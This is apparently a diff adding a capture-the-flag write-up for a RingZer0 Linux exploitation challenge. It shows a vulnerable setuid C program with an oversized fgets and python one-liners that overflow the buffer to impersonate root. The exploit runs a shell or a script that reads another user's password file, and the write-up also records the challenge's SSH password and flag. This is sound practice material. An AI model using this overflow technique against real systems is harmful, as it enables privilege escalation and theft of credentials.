@@ -1,0 +1,95 @@
+Pwnage linux
+Challenge 2
+https://ringzer0ctf.com/challenges/81
+
+ssh -p 10080 level2@challenges.ringzer0ctf.com
+Password : TJyK9lJwZrgqc8nIIF6o
+
+----------------------
+#include <stdio.h>                                                                                                     
+#include <stdlib.h>                                                                                                    
+#include <string.h>                                                                                                    
+#include <unistd.h>                                                                                                    
+                                                                                                                       
+struct USER {                                                                                                          
+        int id;                                                                                                        
+        char name[32];                                                                                                 
+        char pass[32];                                                                                                 
+} u = { 0, "nobody", "Ksdkjkk32avsh" };                                                                                
+                                                                                                                       
+                                                                                                                       
+                                                                                                                       
+int main(int argc, char **argv)                                                                                        
+{                                                                                                                      
+        char user[32];                                                                                                 
+        char pass[32];                                                                                                 
+        char command[64];                                                                                              
+        char *shell[] = { command, 0 };                                                                                
+        char *p;                                                                                                       
+                                                                                                                       
+        printf("Username: ");                                                                                          
+        fgets(user, 31, stdin);                                                                                        
+        p = strchr(user, '\n');                                                                                        
+        if (p)                                                                                                         
+                *p = '\0';                                                                                             
+        if (strcmp(user, u.name))                                                                                      
+                return 0;                                                                                              
+        printf("Password: ");                                                                                          
+        fgets(pass, 31, stdin);
+        p = strchr(pass, '\n');
+        if (p)
+                *p = '\0';
+        if (strcmp(pass, u.pass))
+                return 0;
+        printf("Command: ");
+        if (fgets(command, 128, stdin) == NULL)
+                return 0;
+        p = strchr(command, '\n');
+        if (p)
+                *p = '\0';
+        if (!strcmp(user, "root")) {
+                printf("Good job!\n");
+                printf("command: %s\n", command);
+                setresuid(geteuid(), geteuid(), geteuid());
+                execve(shell[0],shell,0);
+        }
+        else {
+                printf("Okay Mr. %s. Dropping priviledges though.\n", user);
+                setreuid(getuid(), getuid());
+                execve(shell[0],shell,0);
+        }
+        return 0;
+}
+--------------------------------------------
+By using the credentials in struct USER we can execute commands.
+
+If the user is not root we loose our level3 privileges.
+
+The third fgets accept more characters than it should (128 bytes instead of 64).
+
+We can specify the "nobody" user and "Ksdkjkk32avsh" password to get to the command fgets.
+
+Then we can write 64 more bytes to override the user and pass arrays.
+
+If we put "root" in the user variable, we can execute a command as level3
+
+We can pass stdin arguments like this :
+	echo -e "nobody\nKsdkjkk32avsh\n" | ./level2
+
+Or using pyhon.
+	python -c 'user_pass = "nobody\nKsdkjkk32avsh\n"; cmd = "/bin/bash\x00"; filler="\x00"; root_user="root\x00";import sys; sys.stdout.write("{}{}{}{}\n".format(user_pass, cmd, filler*(96-len(cmd)), root_user))'
+
+Seems to work but we don't get a shell. Maybe some quirks of execve ?
+We can get a shell using "nobody" and "/bin/bash" command. It is weird that it doesn't work..
+
+Tried to "cat /home/level3/.pass > /tmp/somefile" but didn't get any ouput in /tmp/somefile...
+
+I wrapped the "cat /home/level3/.pass > /tmp/somefile" in a script /tmp/je.sh
+
+Then using :
+	python -c 'user_pass = "nobody\nKsdkjkk32avsh\n"; cmd = "/tmp/je.sh\0"; filler="\0"; root_user="root\0";import sys; sys.stdout.write("{}{}{}{}\n".format(user_pass, cmd, filler*(96-len(cmd)), root_user))' | ./level2
+
+I was able to retrieve the flag from /tmp/somefile :
+b130hOOfGftXUfmRZlgD
+
+Kinda weird that it didn't work without using a script...
